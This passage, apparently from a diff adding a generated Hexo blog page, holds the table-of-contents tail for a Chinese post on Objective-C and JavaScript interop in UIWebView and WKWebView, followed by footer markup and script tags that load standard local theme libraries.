title="OC&#x548C;js&#x7684;&#x76F8;&#x4E92;&#x8C03;&#x7528;"></a>OC&#x548C;js&#x7684;&#x76F8;&#x4E92;&#x8C03;&#x7528;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#OC调用js"><span class="nav-number">2.1.</span> <span class="nav-text"><a href="#OC&#x8C03;&#x7528;js" class="headerlink" title="OC&#x8C03;&#x7528;js"></a>OC&#x8C03;&#x7528;js</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UIWebView-1"><span class="nav-number">2.1.1.</span> <span class="nav-text"><a href="#UIWebView-1" class="headerlink" title="UIWebView"></a>UIWebView</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WKWebView-1"><span class="nav-number">2.1.2.</span> <span class="nav-text"><a href="#WKWebView-1" class="headerlink" title="WKWebView"></a>WKWebView</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js调用OC"><span class="nav-number">2.2.</span> <span class="nav-text"><a href="#js&#x8C03;&#x7528;OC" class="headerlink" title="js&#x8C03;&#x7528;OC"></a>js&#x8C03;&#x7528;OC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UIWebView-2"><span class="nav-number">2.2.1.</span> <span class="nav-text"><a href="#UIWebView-2" class="headerlink" title="UIWebView"></a>UIWebView</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WKWebView-2"><span class="nav-number">2.2.2.</span> <span class="nav-text"><a href="#WKWebView-2" class="headerlink" title="WKWebView"></a>WKWebView</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m4bln</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
